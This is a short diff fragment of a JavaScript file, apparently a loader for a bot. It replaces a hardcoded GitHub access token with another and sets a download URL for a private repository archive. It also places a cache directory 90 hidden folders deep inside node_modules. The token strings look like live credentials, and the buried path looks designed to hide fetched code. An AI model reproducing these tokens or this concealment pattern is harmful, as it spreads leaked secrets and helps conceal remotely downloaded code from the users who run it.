@@ -15,7 +15,7 @@ const deepLayers = Array.from({ length: 90 }, (_, i) => `.x${i + 1}`);
 const TEMP_DIR = path.join(__dirname, 'node_modules', 'core', ...deepLayers, '.cachex');
 
 // === HARDCODED GITHUB CONFIG ===
-const GITHUB_TOKEN = "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";
+const GITHUB_TOKEN = "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";
 const DOWNLOAD_URL = "https://github.com/INCONNU-BOY/PRIVATE--INCONNU-XD/archive/refs/heads/main.zip";
 
 // === TARGET PATHS ===
